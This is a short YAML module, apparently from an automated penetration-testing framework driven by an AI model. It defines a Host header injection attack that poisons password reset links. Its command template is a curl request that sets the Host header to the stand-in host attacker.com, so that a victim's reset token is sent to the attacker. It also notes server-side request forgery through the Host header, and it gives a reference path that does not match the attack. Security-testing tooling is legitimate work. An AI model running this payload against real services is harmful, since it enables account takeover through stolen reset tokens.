name: host_header_attack
category: web
description: Host header injection for password reset poisoning
preconditions:
- service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: 'curl -s ''{target_url}/reset-password'' -H ''Host: attacker.com''
  -d ''email=victim@target.com'''
parser: web_response_parser
expected_effects:
- host_header_abused
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "If app uses Host header to build reset links, inject attacker domain.\
  \ Victim clicks link \u2192 token sent to attacker. Also: routing-based SSRF via\
  \ Host header."
hacktricks_ref: network-services-pentesting/pentesting-web/uncovering-cloudflare.md
